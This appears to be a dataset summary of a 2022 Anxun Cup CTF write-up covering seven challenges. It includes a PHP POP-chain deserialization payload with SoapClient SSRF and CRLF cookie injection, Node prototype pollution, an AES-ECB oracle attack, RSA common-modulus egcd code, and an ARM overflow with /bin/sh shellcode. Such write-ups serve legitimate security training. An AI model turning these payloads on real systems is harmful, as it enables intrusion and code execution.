---
title: 第五届安洵杯 WriteUp by Mini-Venom(招新)
contest: 安洵杯
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [Web-PHP反序列化,POP链,SoapClient,SSRF,SplFileObject,Node原型链污染,SHA256爆破,AES-ECB,Crypto-RSA三公钥,Diffie-Hellman,Pwn-ARM-QEMU]
attack_chain: index.php: ini_set+d0g3改session.serialize_handler→POST pop反序列化触发A.__wakeup→__invoke(A.a==md5(A.a)=0e215962017)→C.__toString→C.c()→B.__destruct→A.uwant()→call_user_func([SoapClient, a]) SSRF→flag.php?a=SplFileObject&b=/f1111llllllaagg|ssrf.php: SoapClient location+Cookie+user_agent|Node原型链污染: JSON.parse+clone+merge→req.flag==flag触发(实际题目错误,flag在/infoflllllag)|SHA256爆破4字符prefix: head+tail=fuWhjDPmS79bNGOS,target=e9015208236cb20c50d1d04fe11c9cf55dd8365d9410194c283c5100e3bf82d8|AES-ECB密钥: IDl8FuWPu01RHZt} flag2|RSA三公钥: e1,e2,e3+c1,c2,c3+n, egcd组合attack|Diffie-Hellman: PoW2 XOR Whitfield__Diffi|PWN-ARM: qemu启动开启NX+PIE无保护,add r0,pc shellcode+/bin/sh
key_payload: SoapClient(null,array('location'=>'http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg','user_agent'=>"crypt0n\r\nCookie: PHPSESSID=flag2333\r\n",'uri'=>'http://127.0.0.1/'))|str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str)|head(4字符)爆破SHA256|for i in range(16): payload = "0"*8+"0"*(15-i)+flag2+char+"0"*(15-i) c=encrypt(payload) if c[32:64]==c[64:96]: flag2+=char|egcd(e1,e2)+egcd(e1,e3)+egcd(E0,E1)|payload = 'a'*0x28 + p32(elf.bss()+0x2c) + p32(0x10C00) shellcode add r0,pc #12 mov r1,#0 mov r2,#0 mov r7,#11 svc 0|D0g3{o7sIDl8FuWPu01RHZt}|D0g3{New_3ra_@f_PK_Crypt0graphy_1976}
one_liner: 安洵杯2022全方向多题:Web PHP反序列化(POP链A→B→C→A.uwant→call_user_func+SoapClient SSRF→SplFileObject读f1111llllllaagg)+Node原型链污染+SHA256爆破4字符+AES-ECB key=IDl8FuWPu01RHZt}+RSA三公钥egcd+Diffie-Hellman XOR+ARM QEMU无保护shellcode
lesson: 1) PHP反序列化POP链跨类调用:A.__invoke触发`a==md5(a)`(`0e215962017`符合0e正则MD5)+`a->uwant()`+`call_user_func([SoapClient, a])`触发SoapClient.__call SSRF; 2) SoapClient SSRF用location+user_agent注入Cookie:PHPSESSID; 3) Node clone+merge原型链污染:`if(req.flag == "flag")`触发,但本题flag在/infoflllllag; 4) AES-ECB字节翻转攻击:中间位c[32:64]==c[64:96]判断爆破; 5) RSA三公钥攻击(同一m加密):egcd(e1,e2)=E0, egcd(e1,e3)=E1, 双重egcd(E0,E1)恢复m; 6) ARM QEMU启动时NX+PIE无效,bss+0x2c控制跳转; 7) SHA256 head+tail爆破:4字符空间62^4=14.7M
quality: high
---

## 备注

原文(https://www.ctfiot.com/81074.html)ChaMd5 Mini-Venom战队WP,开头招新广告(招re/crypto/pwn/misc/合约方向+IoT+Car+工控+样本分析)。

### 题目清单(7+题)

**1) Web-index.php反序列化+SSRF**
- class A {a, b, __invoke, __wakeup}: `if (a == md5(a)) b->uwant()`
- class B {a, b, k, __destruct}: `b = k; die(a)`
- class C {a, c, __toString, uwant}: `$cc = c; return $cc()`/`call_user_func([reset($_SESSION), a])`
- `if (isset($_GET['d0g3'])) { ini_set($_GET['baby'], $_GET['d0g3']); session_start(); $_SESSION['sess'] = $_POST['sess']; }`
- EXP: 构造SoapClient+location=http://127.0.0.1/flag.php?a=SplFileObject&b=/f1111llllllaagg
- user_agent注入:`crypt0n\r\nCookie: PHPSESSID=flag2333\r\n`
- POP链:`B->a = new C(new A())`,A.a=`0e215962017`(md5后0e开头),A.b=new C(SoapClient),str_replace('O:1:"A":2', 'O:1:"A":3', $ser_str)绕过属性数校验

**2) Node原型链污染**
- clone+merge递归对象合并
- POST / {id: JSON.parse(...)}
- `req.cookies.id = clone(obj)` 触发合并
- 实际flag在/infoflllllag(可能是题目配置错误)

**3) SHA256爆破**
- 4字符prefix,已知tail='fuWhjDPmS79bNGOS'
- target hash=e9015208236cb20c50d1d04fe11c9cf55dd8365d9410194c283c5100e3bf82d8
- 4重for循环爆破(62^4=14.7M)

**4) AES-ECB**
- key=IDl8FuWPu01RHZt}(flag2)
- flag2字节翻转攻击,每轮比较cipher[32:64]==cipher[64:96]

**5) Crypto-RSA三公钥**
- e1, e2, e3 + c1, c2, c3 + n
- 双重egcd攻击:
  ```python
  E0, a, b = egcd(e1, e2)
  cc1 = (pow(c1, a, n) * pow(c2, b, n)) % n
  E1, a, b = egcd(e1, e3)
  cc2 = (pow(c1, a, n) * pow(c3, b, n)) % n
  _, a, b = egcd(E0, E1)
  m = (pow(cc1, a, n) * pow(cc2, b, n)) % n
  ```
- flag:`D0g3{New_3ra_@f_PK_Crypt0graphy_1976}`

**6) Crypto-Diffie-Hellman**
- PoW2: `mid = xor(bytes.fromhex(auth), b"Whitfield__Diffi")`
- payload = b"Whitfield__Diffiex0f" * N + mid + b"e"

**7) Pwn-ARM-QEMU**
- qemu启动,题目本身开NX+PIE但qemu无保护
- payload = 'a'*0x28 + p32(elf.bss() + 0x2c) + p32(0x10C00)
- shellcode(ARM):`add r0, pc, #12; mov r1, #0; mov r2, #0; mov r7, #11; svc 0; .ascii "/bin/sh\0"`

## 评级

- **quality: high** — 7+题覆盖全方向(Web/Crypto/Re/Misc/Pwn),反序列化POP链+SSRF+原型链污染+密码学三重攻击,exp脚本齐全
- **vuln_type: web_unknown** — 混合赛,主分类Web
- 实战价值:PHP反序列化链跨类调用+SoapClient SSRF是高阶组合技;RSA三公钥egcd攻击是经典密码学套路
